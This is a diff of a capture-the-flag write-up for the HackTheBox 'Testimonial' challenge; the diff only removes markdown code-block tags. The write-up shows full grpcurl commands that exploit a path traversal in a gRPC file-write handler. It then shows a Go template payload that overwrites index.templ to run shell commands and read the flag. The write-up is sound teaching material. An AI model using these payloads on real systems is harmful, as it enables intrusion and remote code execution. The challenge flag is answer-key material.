@@ -34,11 +34,9 @@ Tip: you can install VSCode extensions for syntax highlighting, I recommend the 
 
 Note, when running the local docker instance, I immediately notice a warning message.
 
-{% code overflow="wrap" %}
 ```bash
 (!) templ version check: generator v0.2.598 is newer than templ version v0.2.543 found in go.mod file, consider running `go get -u github.com/a-h/templ` to upgrade
 ```
-{% endcode %}
 
 I saw this on another challenge (`LockTalk` - `python-jwt`) and it also caught my attention. In that case, the JWT package was out-of-date and there was a known vulnerability. Let's see if this challenge is the same 🤞
 
@@ -46,11 +44,9 @@ We are using the [v0.2.543 version](https://github.com/a-h/templ/releases/tag/v0
 
 Checking the `entrypoint.sh` file, the flag filename is randomised and it's moved to the root directory, hinting our goal is RCE.
 
-{% code overflow="wrap" %}
 ```bash
 mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
 ```
-{% endcode %}
 
 Let's give the code to ChatGPT for a quick summary.
 
@@ -90,7 +86,6 @@ What can I take away from this? Probably to investigate `gRPC`, `Chi router`, an
 
 While transferring the code to ChatGPT, one particular function stood out for obvious reasons.
 
-{% code overflow="wrap" %}
 ```go
 func (c *Client) SendTestimonial(customer, testimonial string) error {
 	ctx := context.Background()
@@ -103,7 +98,6 @@ func (c *Client) SendTestimonial(customer, testimonial string) error {
 	return err
 }
 ```
-{% endcode %}
 
 Note: ChatGPT spotted the code but attributed it to the wrong function (`HandleHomeIndex`), in a completely different file. You had one job ChatGPT!! I tried to ask about potential vulns but it _really_ did not want to play. Guess we will do this the old way 🧠
 
@@ -111,11 +105,9 @@ One interesting thing is the code indicates that the testimonials we submit are 
 
 Eventually I spotted the `0644` perms and got a shell on the local docker instance to confirm files were being written, they just weren't publicly viewable.
 
-{% code overflow="wrap" %}
 ```go
 err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
 ```
-{% endcode %}
 
 There are some good gRPC tools and resources on [this repo](https://github.com/grpc-ecosystem/awesome-grpc).
 
@@ -125,27 +117,22 @@ We'll start by [listing services](https://github.com/fullstorydev/grpcurl?tab=re
 
 Unfortunately, lots of commands fail due to not supporting the reflection API.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -plaintext 127.0.0.1:50045 list
 
 Failed to list services: server does not support the reflection API
 ```
-{% endcode %}
 
 We can list the services by specifying the proto file.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -import-path ../challenge/pb/ -proto ptypes.proto list
 
 RickyService
 ```
-{% endcode %}
 
 Next, describe the service.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -import-path ../challenge/pb/ -proto ptypes.proto describe RickyService
 
@@ -154,28 +141,23 @@ service RickyService {
   rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
 }
 ```
-{% endcode %}
 
 And method.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -import-path ../challenge/pb/ -proto ptypes.proto describe RickyService.SubmitTestimonial
 
 RickyService.SubmitTestimonial is a method:
 rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
 ```
-{% endcode %}
 
 Try again to invoke the RPC.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -plaintext 127.0.0.1:50045 RickyService.TestimonialSubmission
 
 Error invoking method "RickyService.TestimonialSubmission": failed to query for service descriptor "RickyService": server does not support the reflection API
 ```
-{% endcode %}
 
 According to the docs:
 
@@ -183,7 +165,6 @@ According to the docs:
 
 > In addition to using `-proto` flags to point `grpcurl` at the relevant proto source file(s), you may also need to supply `-import-path` flags to tell `grpcurl` the folders from which dependencies can be imported.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -plaintext -d '{"customer": "test", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial
 
@@ -191,13 +172,11 @@ According to the docs:
   "message": "Testimonial submitted successfully"
 }
 ```
-{% endcode %}
 
 When we check the webpage, we will see our submission! We've essentially bypassed the blacklist filter by submitting the testimonial directly.
 
 Let's confirm that.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -plaintext -d '{"customer": "<script>alert(0)</script>", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial
 
@@ -205,22 +184,18 @@ ERROR:
   Code: Unknown
   Message: open public/testimonials/<script>alert(0)</script>: no such file or directory
 ```
-{% endcode %}
 
 It failed to open that file, because it failed to read the filename. Remember:
 
-{% code overflow="wrap" %}
 ```go
 err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
 if err != nil {
 	return nil, err
 }
 ```
-{% endcode %}
 
 How about directory traversal? If we input `../../../../test.txt`, will it be written to `/`?
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -plaintext -d '{"customer": "../../../../test.txt", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial
 
@@ -228,11 +203,9 @@ How about directory traversal? If we input `../../../../test.txt`, will it be wr
   "message": "Testimonial submitted successfully"
 }
 ```
-{% endcode %}
 
 We can check the local docker instance.
 
-{% code overflow="wrap" %}
 ```bash
 docker exec -it web_testimonial bash
 
@@ -243,11 +216,9 @@ dev                 home                proc                sys
 entrypoint.sh       lib                 root                test.txt
 etc                 media               run                 tmp
 ```
-{% endcode %}
 
 It is! The next part took me a long time - trying to work out how to gain RCE. I was mostly trying to inject payloads into the page, to no avail. In the end, I used the path traversal vuln to replace `index.templ` with a malicious one.
 
-{% code overflow="wrap" %}
 ```go
 package home
 
@@ -272,11 +243,9 @@ templ template(items []string) {
     }
 }
 ```
-{% endcode %}
 
 Ask ChatGPT to escape it for me ofc 😁
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"ls\", \"/\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial
 
@@ -284,11 +253,9 @@ Ask ChatGPT to escape it for me ofc 😁
   "message": "Testimonial submitted successfully"
 }
 ```
-{% endcode %}
 
 Reload the page and get the flag filename, then update our command.
 
-{% code overflow="wrap" %}
 ```bash
 ./grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"cat\", \"/flagbba4cb647c.txt\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial
 
@@ -296,6 +263,5 @@ Reload the page and get the flag filename, then update our command.
   "message": "Testimonial submitted successfully"
 }
 ```
-{% endcode %}
 
 Flag: `HTB{w34kly_t35t3d_t3mplate5}`
